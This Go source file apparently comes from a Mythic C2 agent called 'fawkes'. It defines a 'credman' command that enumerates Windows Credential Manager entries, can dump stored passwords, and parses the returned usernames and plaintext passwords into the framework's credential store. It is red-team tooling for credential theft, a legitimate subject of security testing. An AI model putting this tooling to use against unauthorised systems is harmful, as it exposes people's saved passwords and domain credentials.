package agentfunctions

import (
	"fmt"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "credman",
		Description:         "Enumerate Windows Credential Manager entries (saved passwords, domain credentials)",
		HelpString:          "credman [-action <list|dump>] [-filter <pattern>]",
		Version:             1,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1555.004"},
		ScriptOnlyCommand:   false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"list", "dump"},
				Description:      "list: show credential targets and usernames. dump: also reveal stored passwords.",
				DefaultValue:     "list",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "filter",
				ModalDisplayName: "Filter",
				CLIName:          "filter",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Optional target name filter (e.g., 'Microsoft*', '*domain*'). Empty = all credentials.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
		},
		AssociatedBrowserScript: nil,
		TaskFunctionOPSECPre:    nil,
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			display := fmt.Sprintf("%s", action)
			response.DisplayParams = &display
			createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("CredEnumerateW credential enumeration — %s", action))
			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
			// Parse credman output blocks: --- target ---\n  Type: ...\n  Username: ...\n  Password: ...
			blocks := strings.Split(responseText, "--- ")
			for _, block := range blocks {
				if block == "" || strings.HasPrefix(block, "Summary:") {
					continue
				}
				lines := strings.Split(block, "\n")
				if len(lines) < 2 {
					continue
				}
				target := strings.TrimSuffix(strings.TrimSpace(lines[0]), " ---")
				var username, password, typeName string
				for _, line := range lines[1:] {
					trimmed := strings.TrimSpace(line)
					if strings.HasPrefix(trimmed, "Username:") {
						username = strings.TrimSpace(strings.TrimPrefix(trimmed, "Username:"))
					} else if strings.HasPrefix(trimmed, "Password:") {
						password = strings.TrimSpace(strings.TrimPrefix(trimmed, "Password:"))
					} else if strings.HasPrefix(trimmed, "Type:") {
						typeName = strings.TrimSpace(strings.TrimPrefix(trimmed, "Type:"))
					}
				}
				if username != "" && password != "" {
					creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
						CredentialType: "plaintext",
						Realm:          target,
						Account:        username,
						Credential:     password,
						Comment:        fmt.Sprintf("credman dump (%s)", typeName),
					})
				}
			}
			registerCredentials(processResponse.TaskData.Task.ID, creds)
			return response
		},
	})
}
